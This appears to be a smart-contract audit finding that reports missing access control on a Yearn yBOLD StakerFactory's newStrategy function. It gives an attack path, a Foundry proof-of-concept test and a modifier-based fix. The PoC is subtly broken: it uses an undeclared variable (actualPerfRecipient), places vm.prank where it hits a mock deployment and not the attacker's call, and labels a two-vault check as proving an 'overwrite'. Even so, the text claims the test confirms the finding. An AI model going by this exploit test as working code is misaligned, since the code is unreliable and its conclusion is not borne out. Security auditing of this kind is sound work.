# Attacker will deploy unauthorized strategies causing potential disruption

### Summary

Missing access control on` StakerFactory::newStrategy` will cause potential disruption for the protocol administrators as an attacker will deploy unauthorized strategies linked to the factory's roles and potentially overwrite deployment records.

### Root Cause

https://github.com/sherlock-audit/2025-05-yearn-ybold/blob/main/yv3-liquityv2-sp-strategy/src/StakerFactory.sol#L32
In `StakerFactory.sol` (the `newStrategy` function definition) the function lacks an access control modifier (e.g., `onlyManagement`)

### Internal Pre-conditions

- `StakerFactory` contract is deployed.
- Factory's management, `performanceFeeRecipient`, keeper, `emergencyAdmin` addresses are set during factory deployment.

### External Pre-conditions

None specific required beyond standard blockchain interaction capability.

### Attack Path


- Attacker calls  `StakerFactory::newStrategy(vault_address, "Attacker Strategy")` targeting a specific `vault_address` (can be any valid address, e.g., a mock vault address).
- Factory deploys a new `LV2SPStakerStrategy` instance.
- The deployments[vault_address] mapping in the factory is updated to the attacker's deployed strategy address, potentially overwriting a legitimate pending deployment record if the same `vault_address` was targeted.
- The deployed strategy has its roles `(keeper`, `management`, p`erformanceFeeRecipient`, `emergencyAdmin`) set to the factory's addresses.

### Impact

The protocol administrators may face confusion due to overwritten deployment records or need to manage unintended strategies linked to their roles. There is no direct loss of funds, but potential for operational disruption or griefing.

### PoC

```solidity
function test_POC_StakerFactoryPermissionlessDeployment() public {
        // Attacker has no special role
        assertNotEq(attacker, management);
        assertNotEq(attacker, keeper);
        assertNotEq(attacker, emergencyAdmin);

        //  Attacker calls newStrategy
        vm.prank(attacker);
        
        MockAccountant mockAccountant = new MockAccountant(address(asset));
        MockVault mockVault = new MockVault(address(asset), address(mockAccountant));
      
        address deployedStrategyAddress = stakerFactoryInstance.newStrategy(address(mockVault), "Attacker Strategy");

        // Assert
        // 1. Strategy deployment succeeded
        assertTrue(deployedStrategyAddress != address(0), "Strategy deployment failed");

        // 2. Check roles on the deployed strategy
        IStrategyInterface deployedStrategy = IStrategyInterface(deployedStrategyAddress);

        console.log("Checking performanceFeeRecipient...");

        console.log("Actual Perf Recipient:", actualPerfRecipient);
        console.log("Expected Perf Recipient:", performanceFeeRecipient);
        assertEq(actualPerfRecipient, performanceFeeRecipient, "Performance fee recipient mismatch");
        console.log("PerformanceFeeRecipient OK");

        console.log("Checking keeper...");
        address actualKeeper = deployedStrategy.keeper();
        console.log("Actual Keeper:", actualKeeper);
        console.log("Expected Keeper:", keeper);
        assertEq(actualKeeper, keeper, "Keeper mismatch");
        console.log("Keeper OK");

        console.log("Checking pendingManagement...");
        address actualPendingMgmt = deployedStrategy.pendingManagement();
        console.log("Actual Pending Mgmt:", actualPendingMgmt);
        console.log("Expected Pending Mgmt:", management);
        assertEq(actualPendingMgmt, management, "Pending management mismatch");
        console.log("PendingManagement OK");

        console.log("Checking emergencyAdmin...");
        address actualEmergencyAdmin = deployedStrategy.emergencyAdmin();
        console.log("Actual Emergency Admin:", actualEmergencyAdmin);
        console.log("Expected Emergency Admin:", emergencyAdmin);
        assertEq(actualEmergencyAdmin, emergencyAdmin, "Emergency admin mismatch");
        console.log("EmergencyAdmin OK");

        // 3. Check factory's deployment record
        console.log("Checking factory deployment record...");
        assertTrue(stakerFactoryInstance.isDeployedStrategy(deployedStrategyAddress), "Factory should record the deployed strategy");
        assertEq(stakerFactoryInstance.deployments(address(mockVault)), deployedStrategyAddress, "Deployment mapping incorrect");
        console.log("Factory record OK");

        // 4. Demonstrate overwriting
        console.log("Checking overwrite logic...");
        vm.prank(management); // Legitimate management deploys later
        // Deploy another mock vault for the legit deployment
        MockAccountant legitMockAccountant = new MockAccountant(address(asset));
        MockVault legitMockVault = new MockVault(address(asset), address(legitMockAccountant));
        address legitStrategyAddress = stakerFactoryInstance.newStrategy(address(legitMockVault), "Legit Strategy");
        // Check the deployment record for the new vault address
        assertEq(stakerFactoryInstance.deployments(address(legitMockVault)), legitStrategyAddress, "Legit deployment should be recorded for its vault");
        // The attacker's deployment record should still exist for its vault address
        assertEq(stakerFactoryInstance.deployments(address(mockVault)), deployedStrategyAddress, "Attacker deployment record should persist");
        assertNotEq(legitStrategyAddress, deployedStrategyAddress, "Legit and attacker strategies should be different addresses");
        console.log("Overwrite logic OK");
    }


```

The test confirms that an arbitrary address (attacker) can successfully call `newStrategy` and deploy a `LV2SPStakerStrategy` instance, with roles assigned based on the factory's configuration. This validates the finding.

### Mitigation

If the `StakerFactory` is intended for permissioned deployment, add an appropriate access control modifier (e.g.,`onlyManagement`) to the `newStrategy` function in `StakerFactory.sol`:
```solidity
modifier onlyManagement() {
    require(msg.sender == management, "!management");
    _;
}
```
```solidity
function newStrategy(address _asset, string calldata _name) external virtual onlyManagement returns (address) {
    // ... deployment logic ...
}
```
If the factory is intended for public use, acknowledge the risks of deployment record overwriting and potential spam, and consider if the deployments mapping serves a critical purpose or if an alternative tracking mechanism (e.g., using events) would be more robust.
